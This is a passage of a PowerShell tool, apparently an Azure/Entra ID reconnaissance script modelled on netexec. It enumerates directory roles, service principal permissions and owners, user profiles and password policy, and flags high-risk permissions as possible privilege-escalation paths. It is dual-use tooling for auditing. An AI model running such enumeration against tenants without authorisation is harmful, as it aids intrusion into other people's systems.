                Write-ColorOutput -Message "`n[+] Results exported to: $ExportPath" -Color "Green"
            } elseif ($extension -eq ".html") {
                $stats = [ordered]@{
                    "Total Active Directory Roles" = $activeRoles.Count
                    "Total Role Assignments" = $totalAssignments
                    "Privileged Role Assignments (HIGH RISK)" = $privilegedCount
                    "User Assignments" = $userAssignments
                    "Group Assignments" = $groupAssignments
                    "Service Principal Assignments" = $spnAssignments
                    "PIM Eligible Assignments" = $pimAssignments
                }
                
                $description = "Directory role assignment enumeration including active and PIM eligible assignments. Highlights privileged accounts and group-based role assignments."
                
                $success = Export-HtmlReport -Data $exportData -OutputPath $ExportPath -Title "Role Assignment Enumeration Report" -Statistics $stats -CommandName "roles" -Description $description
                
                if ($success) {
                    Write-ColorOutput -Message "`n[+] HTML report exported to: $ExportPath" -Color "Green"
                }
            } else {
                # Default to CSV
                $exportData | Export-Csv -Path $ExportPath -NoTypeInformation -Force
                Write-ColorOutput -Message "`n[+] Results exported to: $ExportPath" -Color "Green"
            }
        } catch {
            Write-ColorOutput -Message "`n[!] Failed to export results: $_" -Color "Red"
        }
    }
    
    Write-ColorOutput -Message "`n[*] Role assignment enumeration complete!" -Color "Green"
    
    # Display summary statistics
    Write-ColorOutput -Message "`n[*] Summary:" -Color "Yellow"
    Write-ColorOutput -Message "    Total Active Directory Roles: $($activeRoles.Count)" -Color "Cyan"
    Write-ColorOutput -Message "    Total Role Assignments: $totalAssignments" -Color "Cyan"
    Write-ColorOutput -Message "    Privileged Role Assignments: $privilegedCount" -Color "Cyan"
    Write-ColorOutput -Message "    User Assignments: $userAssignments" -Color "Cyan"
    Write-ColorOutput -Message "    Group Assignments: $groupAssignments" -Color "Cyan"
    Write-ColorOutput -Message "    Service Principal Assignments: $spnAssignments" -Color "Cyan"
    if ($pimAssignments -gt 0) {
        Write-ColorOutput -Message "    PIM Eligible Assignments: $pimAssignments" -Color "Cyan"
    }
    
    # Security warnings
    if ($privilegedCount -gt 0) {
        Write-ColorOutput -Message "`n[!] Security Notice:" -Color "Yellow"
        Write-ColorOutput -Message "    [!] Found $privilegedCount privileged role assignments" -Color "Yellow"
        Write-ColorOutput -Message "    [*] Review these accounts for security compliance" -Color "DarkGray"
        Write-ColorOutput -Message "    [*] Ensure MFA is enforced for all privileged accounts" -Color "DarkGray"
    }
    
    if ($groupAssignments -gt 0) {
        Write-ColorOutput -Message "`n[*] Group-Based Role Assignments:" -Color "Yellow"
        Write-ColorOutput -Message "    [*] Found $groupAssignments role assignments via groups" -Color "Cyan"
        Write-ColorOutput -Message "    [*] Review group memberships to understand effective permissions" -Color "DarkGray"
    }
    
    # PIM access guidance
    if ($pimAssignments -eq 0) {
        Write-ColorOutput -Message "`n[*] PIM Eligible Assignments:" -Color "Yellow"
        Write-ColorOutput -Message "    [*] No PIM eligible assignments retrieved" -Color "Cyan"
        Write-ColorOutput -Message "    [*] To enable PIM enumeration:" -Color "DarkGray"
        Write-ColorOutput -Message "        1. Ensure tenant has Azure Entra ID Premium P2 license" -Color "DarkGray"
        Write-ColorOutput -Message "        2. Disconnect: Disconnect-MgGraph" -Color "DarkGray"
        Write-ColorOutput -Message "        3. Reconnect with admin consent for all scopes" -Color "DarkGray"
        Write-ColorOutput -Message "        4. Run: .\azx.ps1 roles" -Color "DarkGray"
    }
}

# Format service principal discovery output like netexec
function Format-ServicePrincipalDiscoveryOutput {
    param(
        [PSCustomObject]$ServicePrincipal,
        [array]$AppRoles,
        [array]$OAuth2Permissions,
        [array]$Owners,
        [array]$HighRiskPermissions = @()
    )
    
    # Service Principal display name
    $displayName = if ($ServicePrincipal.DisplayName) { $ServicePrincipal.DisplayName } else { "UNKNOWN" }
    
    # Truncate long names for column display
    $maxNameLength = 35
    $displayNameShort = if ($displayName.Length -gt $maxNameLength) {
        $displayName.Substring(0, $maxNameLength - 3) + "..."
    } else {
        $displayName
    }
    
    # Use first 15 chars of SPN ID for alignment
    $spnIdShort = if ($ServicePrincipal.Id) { 
        $ServicePrincipal.Id.Substring(0, [Math]::Min(15, $ServicePrincipal.Id.Length))
    } else { 
        "UNKNOWN-ID" 
    }
    
    # Service Principal Type
    $spnType = if ($ServicePrincipal.ServicePrincipalType) { $ServicePrincipal.ServicePrincipalType } else { "Application" }
    
    # App ID
    $appId = if ($ServicePrincipal.AppId) { $ServicePrincipal.AppId } else { "N/A" }
    
    # Account status
    $accountEnabled = if ($ServicePrincipal.AccountEnabled) { "Enabled" } else { "Disabled" }
    
    # Count credentials
    $passwordCreds = if ($ServicePrincipal.PasswordCredentials) { $ServicePrincipal.PasswordCredentials.Count } else { 0 }
    $certCreds = if ($ServicePrincipal.KeyCredentials) { $ServicePrincipal.KeyCredentials.Count } else { 0 }
    
    # Count permissions
    $appRoleCount = if ($AppRoles) { $AppRoles.Count } else { 0 }
    $oauth2PermCount = if ($OAuth2Permissions) { $OAuth2Permissions.Count } else { 0 }
    $ownerCount = if ($Owners) { $Owners.Count } else { 0 }
    
    # Check if this SPN has high-risk permissions
    $hasHighRiskPermissions = $false
    if ($HighRiskPermissions.Count -gt 0) {
        # Check OAuth2 permissions for high-risk permissions
        foreach ($perm in $OAuth2Permissions) {
            if ($perm.Scope) {
                $grantedScopes = $perm.Scope -split ' '
                $hasHighRisk = $grantedScopes | Where-Object { $_ -in $HighRiskPermissions }
                if ($hasHighRisk) {
                    $hasHighRiskPermissions = $true
                    break
                }
            }
        }
        
        # Check App Roles for high-risk permissions
        if (-not $hasHighRiskPermissions) {
            foreach ($role in $AppRoles) {
                if ($role.Value -in $HighRiskPermissions) {
                    $hasHighRiskPermissions = $true
                    break
                }
            }
        }
    }
    
    # Build main output line
    $output = "AZR".PadRight(12) + 
              $spnIdShort.PadRight(17) + 
              "443".PadRight(7) + 
              $displayNameShort.PadRight(38) + 
              "[*] (appId:$appId) (type:$spnType) (status:$accountEnabled) (pwdCreds:$passwordCreds) (certCreds:$certCreds) (appRoles:$appRoleCount) (delegated:$oauth2PermCount) (owners:$ownerCount)"
    
    # Color based on status and security posture
    $color = "Cyan"
    if ($hasHighRiskPermissions) {
        $color = "Red"  # High-risk permissions in red - highest priority
    } elseif ($accountEnabled -eq "Disabled") {
        $color = "DarkGray"  # Disabled SPNs in gray
    } elseif ($passwordCreds -gt 0 -and $certCreds -eq 0) {
        $color = "Yellow"  # Password-only credentials in yellow (security risk)
    } elseif ($appRoleCount -gt 0 -or $oauth2PermCount -gt 0) {
        $color = "Green"  # SPNs with permissions in green
    }
    
    Write-ColorOutput -Message $output -Color $color
    
    # Display app roles (application permissions)
    if ($AppRoles -and $AppRoles.Count -gt 0) {
        Write-ColorOutput -Message "    [+] Application Permissions (App Roles):" -Color "Cyan"
        foreach ($role in $AppRoles) {
            $roleName = if ($role.Value) { $role.Value } else { "Unknown" }
            $roleId = if ($role.Id) { $role.Id } else { "N/A" }
            $resource = if ($role.ResourceDisplayName) { $role.ResourceDisplayName } else { "Unknown Resource" }
            
            # Check if this is a high-risk permission
            $permColor = "DarkCyan"
            if ($HighRiskPermissions.Count -gt 0 -and $roleName -in $HighRiskPermissions) {
                $permColor = "Red"
            }
            
            Write-ColorOutput -Message "        [-] $resource : $roleName (ID: $roleId)" -Color $permColor
        }
    }
    
    # Display OAuth2 permissions (delegated permissions)
    if ($OAuth2Permissions -and $OAuth2Permissions.Count -gt 0) {
        Write-ColorOutput -Message "    [+] Delegated Permissions (OAuth2):" -Color "Cyan"
        foreach ($perm in $OAuth2Permissions) {
            $scope = if ($perm.Scope) { $perm.Scope } else { "Unknown" }
            $consentType = if ($perm.ConsentType) { $perm.ConsentType } else { "Unknown" }
            $resource = if ($perm.ResourceDisplayName) { $perm.ResourceDisplayName } else { "Unknown Resource" }
            
            # Check if any of the scopes are high-risk
            $permColor = "DarkCyan"
            if ($HighRiskPermissions.Count -gt 0 -and $scope) {
                $grantedScopes = $scope -split ' '
                $hasHighRisk = $grantedScopes | Where-Object { $_ -in $HighRiskPermissions }
                if ($hasHighRisk) {
                    $permColor = "Red"
                }
            }
            
            Write-ColorOutput -Message "        [-] $resource : $scope (ConsentType: $consentType)" -Color $permColor
        }
    }
    
    # Display owners
    if ($Owners -and $Owners.Count -gt 0) {
        Write-ColorOutput -Message "    [+] Owners:" -Color "Cyan"
        foreach ($owner in $Owners) {
            $ownerName = if ($owner.DisplayName) { $owner.DisplayName } else { "Unknown" }
            $ownerType = if ($owner.'@odata.type') { 
                $owner.'@odata.type' -replace '#microsoft.graph.', '' 
            } else { 
                "Unknown" 
            }
            $ownerUPN = if ($owner.UserPrincipalName) { " ($($owner.UserPrincipalName))" } else { "" }
            Write-ColorOutput -Message "        [-] $ownerName [$ownerType]$ownerUPN" -Color "DarkCyan"
        }
    }
    
    Write-ColorOutput -Message "" -Color "White"
}

# Main Service Principal Discovery function
function Invoke-ServicePrincipalDiscovery {
    param(
        [string]$ExportPath
    )
    
    Write-ColorOutput -Message "`n[*] AZX - Azure/Entra Service Principal Discovery" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: Service Principal Permission and Assignment Enumeration" -Color "Yellow"
    Write-ColorOutput -Message "[*] Discovers service principals with their permissions, roles, and ownership`n" -Color "Yellow"
    
    # Get context to display current user info
    $context = Get-MgContext
    if ($context) {
        Write-ColorOutput -Message "[*] Authenticated as: $($context.Account)" -Color "Cyan"
        Write-ColorOutput -Message "[*] Tenant: $($context.TenantId)`n" -Color "Cyan"
    }
    
    # Prepare export data
    $exportData = @()
    
    # ===== PHASE 1: ENUMERATE SERVICE PRINCIPALS =====
    Write-ColorOutput -Message "[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] PHASE 1: Service Principal Enumeration" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    Write-ColorOutput -Message "[*] Retrieving service principals from Azure/Entra ID..." -Color "Yellow"
    Write-ColorOutput -Message "[*] This may take a while for large organizations...`n" -Color "Yellow"
    
    try {
        $allSPNs = Get-MgServicePrincipal -All -Property "id,displayName,appId,servicePrincipalType,passwordCredentials,keyCredentials,signInAudience,tags,accountEnabled,createdDateTime,appRoles,oauth2PermissionScopes" -ErrorAction Stop
        Write-ColorOutput -Message "[+] Retrieved $($allSPNs.Count) service principals`n" -Color "Green"
    } catch {
        Write-ColorOutput -Message "[!] Failed to retrieve service principals: $_" -Color "Red"
        Write-ColorOutput -Message "[!] Ensure you have Application.Read.All or Directory.Read.All permissions" -Color "Red"
        Write-ColorOutput -Message "[*] Guest users may have restricted access to service principal enumeration" -Color "Yellow"
        return
    }
    
    if ($allSPNs.Count -eq 0) {
        Write-ColorOutput -Message "[!] No service principals found or insufficient permissions`n" -Color "Red"
        return
    }
    
    # ===== PHASE 2: ENUMERATE PERMISSIONS =====
    Write-ColorOutput -Message "[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] PHASE 2: Permission Discovery" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    Write-ColorOutput -Message "[*] Retrieving app role assignments (application permissions)..." -Color "Yellow"
    
    $appRoleAssignments = @{}
    try {
        # Get all app role assignments
        $allAppRoleAssignments = Invoke-MgGraphRequest -Uri "https://graph.microsoft.com/v1.0/servicePrincipals?`$expand=appRoleAssignedTo" -Method GET -ErrorAction Stop
        
        foreach ($spn in $allAppRoleAssignments.value) {
            if ($spn.appRoleAssignedTo -and $spn.appRoleAssignedTo.Count -gt 0) {
                $appRoleAssignments[$spn.id] = $spn.appRoleAssignedTo
            }
        }
        
        Write-ColorOutput -Message "[+] Retrieved app role assignments for $($appRoleAssignments.Count) service principals`n" -Color "Green"
    } catch {
        Write-ColorOutput -Message "[!] Failed to retrieve app role assignments: $_" -Color "Yellow"
        Write-ColorOutput -Message "[*] Continuing with limited permission data...`n" -Color "Yellow"
    }
    
    Write-ColorOutput -Message "[*] Retrieving OAuth2 permission grants (delegated permissions)..." -Color "Yellow"
    
    $oauth2Grants = @{}
    try {
        $allOAuth2Grants = Invoke-MgGraphRequest -Uri "https://graph.microsoft.com/v1.0/oauth2PermissionGrants" -Method GET -ErrorAction Stop
        
        foreach ($grant in $allOAuth2Grants.value) {
            $clientId = $grant.clientId
            if (-not $oauth2Grants.ContainsKey($clientId)) {
                $oauth2Grants[$clientId] = @()
            }
            $oauth2Grants[$clientId] += $grant
        }
        
        Write-ColorOutput -Message "[+] Retrieved OAuth2 permission grants for $($oauth2Grants.Count) service principals`n" -Color "Green"
    } catch {
        Write-ColorOutput -Message "[!] Failed to retrieve OAuth2 permission grants: $_" -Color "Yellow"
        Write-ColorOutput -Message "[*] Continuing with limited permission data...`n" -Color "Yellow"
    }
    
    # ===== PHASE 3: ENUMERATE OWNERS =====
    Write-ColorOutput -Message "[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] PHASE 3: Ownership Discovery" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    Write-ColorOutput -Message "[*] Retrieving service principal owners..." -Color "Yellow"
    Write-ColorOutput -Message "[*] This may take a while...`n" -Color "Yellow"
    
    $ownershipData = @{}
    $ownersRetrieved = 0
    
    foreach ($spn in $allSPNs) {
        try {
            $owners = Get-MgServicePrincipalOwner -ServicePrincipalId $spn.Id -ErrorAction SilentlyContinue
            if ($owners -and $owners.Count -gt 0) {
                $ownershipData[$spn.Id] = $owners
                $ownersRetrieved++
            }
        } catch {
            # Silently continue if we can't get owners for this SPN
        }
    }
    
    Write-ColorOutput -Message "[+] Retrieved ownership data for $ownersRetrieved service principals`n" -Color "Green"
    
    # Define high-risk permissions for highlighting
    $highRiskPermissions = @(
        "RoleManagement.ReadWrite.Directory",
        "AppRoleAssignment.ReadWrite.All",
        "Application.ReadWrite.All",
        "Directory.ReadWrite.All"
    )
    
    # ===== PHASE 4: DISPLAY RESULTS =====
    Write-ColorOutput -Message "[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] PHASE 4: Service Principal Details" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    Write-ColorOutput -Message "[*] Displaying $($allSPNs.Count) service principals with permissions`n" -Color "Green"
    
    # Enumerate service principals with their permissions
    foreach ($spn in $allSPNs) {
        # Get app roles for this SPN
        $spnAppRoles = @()
        if ($appRoleAssignments.ContainsKey($spn.Id)) {
            foreach ($assignment in $appRoleAssignments[$spn.Id]) {
                # Try to resolve the app role name
                $resourceSPN = $allSPNs | Where-Object { $_.Id -eq $assignment.resourceId } | Select-Object -First 1
                $appRoleName = "Unknown"
                if ($resourceSPN -and $resourceSPN.AppRoles) {
                    $matchingRole = $resourceSPN.AppRoles | Where-Object { $_.Id -eq $assignment.appRoleId } | Select-Object -First 1
                    if ($matchingRole) {
                        $appRoleName = $matchingRole.Value
                    }
                }
                
                $spnAppRoles += [PSCustomObject]@{
                    Id = $assignment.appRoleId
                    Value = $appRoleName
                    ResourceDisplayName = $assignment.resourceDisplayName
                }
            }
        }
        
        # Get OAuth2 permissions for this SPN
        $spnOAuth2Perms = @()
        if ($oauth2Grants.ContainsKey($spn.Id)) {
            foreach ($grant in $oauth2Grants[$spn.Id]) {
                # Try to resolve resource display name
                $resourceSPN = $allSPNs | Where-Object { $_.Id -eq $grant.resourceId } | Select-Object -First 1
                $resourceDisplayName = if ($resourceSPN) { $resourceSPN.DisplayName } else { "Unknown" }
                
                $spnOAuth2Perms += [PSCustomObject]@{
                    Scope = $grant.scope
                    ConsentType = $grant.consentType
                    ResourceDisplayName = $resourceDisplayName
                    ResourceId = $grant.resourceId
                }
            }
        }
        
        # Get owners for this SPN
        $spnOwners = @()
        if ($ownershipData.ContainsKey($spn.Id)) {
            $spnOwners = $ownershipData[$spn.Id]
        }
        
        # Format and display output
        Format-ServicePrincipalDiscoveryOutput -ServicePrincipal $spn -AppRoles $spnAppRoles -OAuth2Permissions $spnOAuth2Perms -Owners $spnOwners -HighRiskPermissions $highRiskPermissions
        
        # Collect for export
        if ($ExportPath) {
            $exportData += [PSCustomObject]@{
                ObjectId = $spn.Id
                AppId = $spn.AppId
                DisplayName = $spn.DisplayName
                ServicePrincipalType = $spn.ServicePrincipalType
                AccountEnabled = $spn.AccountEnabled
                SignInAudience = $spn.SignInAudience
                PasswordCredentials = $spn.PasswordCredentials.Count
                KeyCredentials = $spn.KeyCredentials.Count
                Tags = ($spn.Tags -join ";")
                CreatedDateTime = $spn.CreatedDateTime
                AppRoleCount = $spnAppRoles.Count
                AppRoles = ($spnAppRoles | ForEach-Object { "$($_.ResourceDisplayName):$($_.Value)" }) -join "; "
                OAuth2PermissionCount = $spnOAuth2Perms.Count
                OAuth2Permissions = ($spnOAuth2Perms | ForEach-Object { "$($_.ResourceDisplayName):$($_.Scope)" }) -join "; "
                OwnerCount = $spnOwners.Count
                Owners = ($spnOwners | ForEach-Object { $_.DisplayName }) -join "; "
            }
        }
    }
    
    # Calculate summary statistics
    $spnsWithPasswordCreds = ($allSPNs | Where-Object { $_.PasswordCredentials.Count -gt 0 }).Count
    $spnsWithCertCreds = ($allSPNs | Where-Object { $_.KeyCredentials.Count -gt 0 }).Count
    $enabledSPNs = ($allSPNs | Where-Object { $_.AccountEnabled -eq $true }).Count
    $managedIdentities = ($allSPNs | Where-Object { $_.ServicePrincipalType -eq "ManagedIdentity" }).Count
    $passwordOnlySPNs = ($allSPNs | Where-Object { $_.PasswordCredentials.Count -gt 0 -and $_.KeyCredentials.Count -eq 0 }).Count
    
    # Export if requested
    if ($ExportPath -and $exportData.Count -gt 0) {
        try {
            $extension = [System.IO.Path]::GetExtension($ExportPath).ToLower()
            
            if ($extension -eq ".csv") {
                $exportData | Export-Csv -Path $ExportPath -NoTypeInformation -Force
                Write-ColorOutput -Message "[+] Results exported to: $ExportPath" -Color "Green"
            } elseif ($extension -eq ".json") {
                $exportData | ConvertTo-Json -Depth 5 | Out-File -FilePath $ExportPath -Force
                Write-ColorOutput -Message "[+] Results exported to: $ExportPath" -Color "Green"
            } elseif ($extension -eq ".html") {
                $stats = [ordered]@{
                    "Total Service Principals" = $allSPNs.Count
                    "Enabled Service Principals" = $enabledSPNs
                    "Password-Only SPNs (HIGH RISK)" = $passwordOnlySPNs
                    "SPNs with Password Credentials" = $spnsWithPasswordCreds
                    "SPNs with Certificate Credentials" = $spnsWithCertCreds
                    "Managed Identities" = $managedIdentities
                    "SPNs with App Role Assignments" = $appRoleAssignments.Count
                    "SPNs with OAuth2 Permission Grants" = $oauth2Grants.Count
                    "SPNs with Owners" = $ownersRetrieved
                }
                
                $description = "Service principal discovery with detailed permissions, role assignments, and ownership information. Identifies high-risk permissions and password-only credentials."
                
                $success = Export-HtmlReport -Data $exportData -OutputPath $ExportPath -Title "Service Principal Discovery Report" -Statistics $stats -CommandName "sp-discovery" -Description $description
                
                if ($success) {
                    Write-ColorOutput -Message "[+] HTML report exported to: $ExportPath" -Color "Green"
                }
            } else {
                # Default to CSV
                $exportData | Export-Csv -Path $ExportPath -NoTypeInformation -Force
                Write-ColorOutput -Message "[+] Results exported to: $ExportPath" -Color "Green"
            }
        } catch {
            Write-ColorOutput -Message "[!] Failed to export results: $_" -Color "Red"
        }
    }
    
    # Display summary statistics
    Write-ColorOutput -Message "`n[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] Summary Statistics" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    Write-ColorOutput -Message "[*] Service Principals:" -Color "Yellow"
    Write-ColorOutput -Message "    Total Service Principals: $($allSPNs.Count)" -Color "Cyan"
    Write-ColorOutput -Message "    Enabled Service Principals: $enabledSPNs" -Color "Cyan"
    Write-ColorOutput -Message "    SPNs with Password Credentials: $spnsWithPasswordCreds" -Color "Cyan"
    Write-ColorOutput -Message "    SPNs with Certificate Credentials: $spnsWithCertCreds" -Color "Cyan"
    Write-ColorOutput -Message "    Managed Identities: $managedIdentities" -Color "Cyan"
    
    Write-ColorOutput -Message "`n[*] Permissions:" -Color "Yellow"
    Write-ColorOutput -Message "    SPNs with App Role Assignments: $($appRoleAssignments.Count)" -Color "Cyan"
    Write-ColorOutput -Message "    SPNs with OAuth2 Permission Grants: $($oauth2Grants.Count)" -Color "Cyan"
    
    Write-ColorOutput -Message "`n[*] Ownership:" -Color "Yellow"
    Write-ColorOutput -Message "    SPNs with Owners: $ownersRetrieved" -Color "Cyan"
    
    # Security findings
    if ($passwordOnlySPNs -gt 0) {
        Write-ColorOutput -Message "`n[!] Security Warnings:" -Color "Yellow"
        Write-ColorOutput -Message "    [!] Found $passwordOnlySPNs service principals with password-only credentials" -Color "Yellow"
        Write-ColorOutput -Message "    [*] These are vulnerable to credential theft (similar to SMB without signing)" -Color "DarkGray"
        Write-ColorOutput -Message "    [*] Recommendation: Use certificate-based authentication instead" -Color "DarkGray"
    }
    
    # Identify high-risk permissions
    $highRiskPermissions = @(
        "RoleManagement.ReadWrite.Directory",
        "AppRoleAssignment.ReadWrite.All",
        "Application.ReadWrite.All",
        "Directory.ReadWrite.All"
    )
    
    $spnsWithHighRiskPerms = 0
    foreach ($spnId in $oauth2Grants.Keys) {
        foreach ($grant in $oauth2Grants[$spnId]) {
            $grantedScopes = $grant.scope -split ' '
            $hasHighRisk = $grantedScopes | Where-Object { $_ -in $highRiskPermissions }
            if ($hasHighRisk) {
                $spnsWithHighRiskPerms++
                break
            }
        }
    }
    
    if ($spnsWithHighRiskPerms -gt 0) {
        Write-ColorOutput -Message "    [!] Found $spnsWithHighRiskPerms service principals with high-risk permissions" -Color "Yellow"
        Write-ColorOutput -Message "    [*] These permissions can modify directory, roles, or applications" -Color "DarkGray"
        Write-ColorOutput -Message "    [*] Review these service principals for potential privilege escalation paths" -Color "DarkGray"
    }
    
    Write-ColorOutput -Message "`n[*] Service Principal discovery complete!" -Color "Green"
}

# Format user profile output like netexec
function Format-UserProfileOutput {
    param(
        [PSCustomObject]$User
    )
    
    # User display name
    $displayName = if ($User.DisplayName) { $User.DisplayName } else { "UNKNOWN" }
    
    # Truncate long names for column display
    $maxNameLength = 35
    $displayNameShort = if ($displayName.Length -gt $maxNameLength) {
        $displayName.Substring(0, $maxNameLength - 3) + "..."
    } else {
        $displayName
    }
    
    # Use first 15 chars of user ID for alignment
    $userIdShort = if ($User.Id) { 
        $User.Id.Substring(0, [Math]::Min(15, $User.Id.Length))
    } else { 
        "UNKNOWN-ID" 
    }
    
    # User Principal Name
    $upn = if ($User.UserPrincipalName) { $User.UserPrincipalName } else { "N/A" }
    
    # Job title
    $jobTitle = if ($User.JobTitle) { $User.JobTitle } else { "N/A" }
    
    # Department
    $department = if ($User.Department) { $User.Department } else { "N/A" }
    
    # User type (Member or Guest)
    $userType = if ($User.UserType) { $User.UserType } else { "Member" }
    
    # Account enabled status
    $accountEnabled = if ($User.AccountEnabled) { "Enabled" } else { "Disabled" }
    
    # Office location
    $officeLocation = if ($User.OfficeLocation) { $User.OfficeLocation } else { "N/A" }
    
    # Last sign-in date
    $lastSignIn = if ($User.SignInActivity -and $User.SignInActivity.LastSignInDateTime) { 
        $User.SignInActivity.LastSignInDateTime.ToString("yyyy-MM-dd")
    } else { 
        "Never/Unknown" 
    }
    
    $output = "AZR".PadRight(12) + 
              $userIdShort.PadRight(17) + 
              "443".PadRight(7) + 
              $displayNameShort.PadRight(38) + 
              "[*] (upn:$upn) (job:$jobTitle) (dept:$department) (type:$userType) (status:$accountEnabled) (location:$officeLocation) (lastSignIn:$lastSignIn)"
    
    # Color based on user type and status
    $color = "Cyan"
    if ($userType -eq "Guest") {
        $color = "Yellow"  # Guest users in yellow
    } elseif ($accountEnabled -eq "Disabled") {
        $color = "DarkGray"  # Disabled users in gray
    } else {
        $color = "Green"  # Active member users in green
    }
    
    Write-ColorOutput -Message $output -Color $color
}

# Main user profile enumeration function
function Invoke-UserProfileEnumeration {
    param(
        [string]$ExportPath
    )
    
    Write-ColorOutput -Message "`n[*] AZX - Azure/Entra User Profile Enumeration" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: User Profile Enumeration (Authenticated)" -Color "Yellow"
    Write-ColorOutput -Message "[*] Method: Microsoft Graph API with current user permissions`n" -Color "Yellow"
    
    # Get context to display current user info
    $context = Get-MgContext
    if ($context) {
        Write-ColorOutput -Message "[*] Authenticated as: $($context.Account)" -Color "Cyan"
        Write-ColorOutput -Message "[*] Tenant: $($context.TenantId)`n" -Color "Cyan"
    }
    
    # Get all users
    Write-ColorOutput -Message "[*] Retrieving user profiles from Azure/Entra ID..." -Color "Yellow"
    Write-ColorOutput -Message "[*] This may take a while for large organizations...`n" -Color "Yellow"
    
    try {
        # Try to get users with sign-in activity (requires AuditLog.Read.All)
        # If that fails, fall back to basic user info
        $allUsers = @()
        
        try {
            Write-ColorOutput -Message "[*] Attempting to retrieve users with sign-in activity..." -Color "Yellow"
            $allUsers = Get-MgUser -All -Property "Id,DisplayName,UserPrincipalName,JobTitle,Department,UserType,AccountEnabled,OfficeLocation,Mail,SignInActivity" -ErrorAction Stop
            Write-ColorOutput -Message "[+] Retrieved $($allUsers.Count) users with sign-in activity`n" -Color "Green"
        } catch {
            # Fall back to basic properties if sign-in activity is not available
            Write-ColorOutput -Message "[!] Could not retrieve sign-in activity (requires AuditLog.Read.All)" -Color "Yellow"
            Write-ColorOutput -Message "[*] Falling back to basic user properties...`n" -Color "Yellow"
            $allUsers = Get-MgUser -All -Property "Id,DisplayName,UserPrincipalName,JobTitle,Department,UserType,AccountEnabled,OfficeLocation,Mail" -ErrorAction Stop
            Write-ColorOutput -Message "[+] Retrieved $($allUsers.Count) users`n" -Color "Green"
        }
        
    } catch {
        Write-ColorOutput -Message "[!] Failed to retrieve users: $_" -Color "Red"
        Write-ColorOutput -Message "[!] Ensure you have User.Read.All or Directory.Read.All permissions" -Color "Red"
        Write-ColorOutput -Message "[*] Guest users may have restricted access to user enumeration" -Color "Yellow"
        return
    }
    
    if ($allUsers.Count -eq 0) {
        Write-ColorOutput -Message "[!] No users found or insufficient permissions" -Color "Red"
        return
    }
    
    Write-ColorOutput -Message "[*] Displaying $($allUsers.Count) users`n" -Color "Green"
    
    # Prepare export data
    $exportData = @()
    
    # Enumerate users
    foreach ($user in $allUsers) {
        Format-UserProfileOutput -User $user
        
        # Collect for export
        if ($ExportPath) {
            $lastSignIn = if ($user.SignInActivity -and $user.SignInActivity.LastSignInDateTime) {
                $user.SignInActivity.LastSignInDateTime
            } else {
                $null
            }
            
            $exportData += [PSCustomObject]@{
                UserId              = $user.Id
                DisplayName         = $user.DisplayName
                UserPrincipalName   = $user.UserPrincipalName
                Mail                = $user.Mail
                JobTitle            = $user.JobTitle
                Department          = $user.Department
                OfficeLocation      = $user.OfficeLocation
                UserType            = $user.UserType
                AccountEnabled      = $user.AccountEnabled
                LastSignInDateTime  = $lastSignIn
            }
        }
    }
    
    # Calculate summary statistics
    $memberUsers = ($allUsers | Where-Object { $_.UserType -eq "Member" -or -not $_.UserType }).Count
    $guestUsers = ($allUsers | Where-Object { $_.UserType -eq "Guest" }).Count
    $enabledUsers = ($allUsers | Where-Object { $_.AccountEnabled -eq $true }).Count
    $disabledUsers = ($allUsers | Where-Object { $_.AccountEnabled -eq $false }).Count
    
    # Export if requested
    if ($ExportPath) {
        try {
            $extension = [System.IO.Path]::GetExtension($ExportPath).ToLower()
            
            if ($extension -eq ".csv") {
                $exportData | Export-Csv -Path $ExportPath -NoTypeInformation -Force
                Write-ColorOutput -Message "`n[+] Results exported to: $ExportPath" -Color "Green"
            } elseif ($extension -eq ".json") {
                $exportData | ConvertTo-Json -Depth 5 | Out-File -FilePath $ExportPath -Force
                Write-ColorOutput -Message "`n[+] Results exported to: $ExportPath" -Color "Green"
            } elseif ($extension -eq ".html") {
                $stats = [ordered]@{
                    "Total Users" = $allUsers.Count
                    "Member Users" = $memberUsers
                    "Guest Users" = $guestUsers
                    "Enabled Accounts" = $enabledUsers
                    "Disabled Accounts" = $disabledUsers
                }
                
                $description = "Comprehensive user profile enumeration including job titles, departments, and account status. Includes sign-in activity when available."
                
                $success = Export-HtmlReport -Data $exportData -OutputPath $ExportPath -Title "User Profile Enumeration Report" -Statistics $stats -CommandName "user-profiles" -Description $description
                
                if ($success) {
                    Write-ColorOutput -Message "`n[+] HTML report exported to: $ExportPath" -Color "Green"
                }
            } else {
                # Default to CSV
                $exportData | Export-Csv -Path $ExportPath -NoTypeInformation -Force
                Write-ColorOutput -Message "`n[+] Results exported to: $ExportPath" -Color "Green"
            }
        } catch {
            Write-ColorOutput -Message "`n[!] Failed to export results: $_" -Color "Red"
        }
    }
    
    Write-ColorOutput -Message "`n[*] User profile enumeration complete!" -Color "Green"
    
    # Display summary statistics
    Write-ColorOutput -Message "`n[*] Summary:" -Color "Yellow"
    Write-ColorOutput -Message "    Total Users: $($allUsers.Count)" -Color "Cyan"
    Write-ColorOutput -Message "    Member Users: $memberUsers" -Color "Cyan"
    Write-ColorOutput -Message "    Guest Users: $guestUsers" -Color "Cyan"
    Write-ColorOutput -Message "    Enabled Accounts: $enabledUsers" -Color "Cyan"
    Write-ColorOutput -Message "    Disabled Accounts: $disabledUsers" -Color "Cyan"
}

# Main password policy enumeration function
function Invoke-PasswordPolicyEnumeration {
    param(
        [string]$ExportPath
    )
    
    Write-ColorOutput -Message "`n[*] AZX - Azure/Entra Password Policy Enumeration" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: Password Policy" -Color "Yellow"
    Write-ColorOutput -Message "[*] Similar to: nxc smb --pass-pol`n" -Color "Yellow"
    
    # Get organization/tenant information
    Write-ColorOutput -Message "[*] Retrieving tenant password policies..." -Color "Yellow"
    
    $policyData = @{
        TenantId = $null
        TenantDisplayName = $null
        PasswordPolicies = @{}
        SecurityDefaults = $null
